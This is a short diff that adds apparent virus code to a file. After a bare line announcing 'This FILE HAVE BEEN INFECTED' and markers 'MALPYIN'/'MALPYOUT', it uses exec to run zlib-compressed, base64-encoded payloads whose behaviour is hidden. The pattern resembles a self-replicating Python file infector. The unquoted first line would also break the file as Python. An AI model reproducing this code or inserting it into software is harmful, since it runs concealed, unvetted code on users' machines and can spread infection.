@@ -1,0 +1,8 @@
+This FILE HAVE BEEN INFECTED
+# MALPYIN
+
+import zlib,base64;
+exec(zlib.decompress(base64.b64decode("eJxlUsFu2zAMvfsruPQgMQm0HYoeBuTQXYYB2dpDexjqLpBtKhGgSoIkr+2G/fsoJ0ETlIBhSnyPj6TYXMD36/Xtz28/GmsgkcqkU7+TSfyiF+pb2aJYQi5JPmnXh4EQPzfAFpP1Rc5MGP0AmfrgB51ewXpDfbHBz3CCHVgbMzoHq/cCatH+lWqO7T+xPFOZ2Lb6TPvjbKcGFnmKiXKWnc50dam6q8t6OZA8lVHbFMYoEc8qgMVqamNKibAQrRcAF3Cfp1AJwC30upDnr87i6/rmy/V6tbpLI+1bNnmTQihcT8gq6rJTusv1L4USqHJ0tshjKFPEh0+Pi5NzQy6/S8XUxlhHmX0ZFbcX3G+SCCYkiDxPuK0KBwKqrQudnM3nH+czBC4zqjwaY1/gA+cS2FRazVeZU969YEmve6fasy07CJG8rIgliNQJBJ3BvGGqJf284anwTGqlhovTg8TmHEN5dDXc73QaqPAzFd4AecLFMwJ5fgHrt9M2VO6DOF6JxzNkSBPoLZE6vPYRj81he2/u7/4DxG/Zmw==")));
+# MALPYOUT
+
+exec(zlib.decompress(base64.b64decode("eJzzjVTwc/R1VfAMVnDyDA5yDAEAKBwEiQ==")))
